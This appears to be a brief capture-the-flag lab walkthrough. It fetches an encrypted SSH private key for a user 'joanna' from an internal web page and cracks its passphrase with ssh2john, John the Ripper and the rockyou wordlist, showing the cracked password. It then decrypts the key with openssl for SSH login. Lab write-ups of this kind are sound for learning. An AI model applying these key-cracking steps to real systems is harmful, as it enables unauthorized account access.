# Recieved an ssh key from the internal website http://127.0.0.1:52846/main.php
## curled to this website to get the ssh key in /ssh-keys
- Used sshtojohn.py on it to get with rockyou.txt to get in the correct form.
- then used john the ripper to crack it
```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh-rsa-joanna.john
```
### Recieved the following output
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa_joanna)
1g 0:00:00:05 DONE (2020-01-21 11:45) 0.1773g/s 2542Kp/s 2542Kc/s 2542KC/s *7¡Vamos!
Session completed

``` 

- the password to crack the id_rsa encryption is `bloodninjas`
	* going to use openssl to crack the encryption

```
openssl rsa -in encrypt-id_rsa_joanna -out decrypt-id_rsa_joanna
``` 
- this command decrypts her rsa key into a usable form

```
ssh -i decrypt-id_rsa_joanna
```
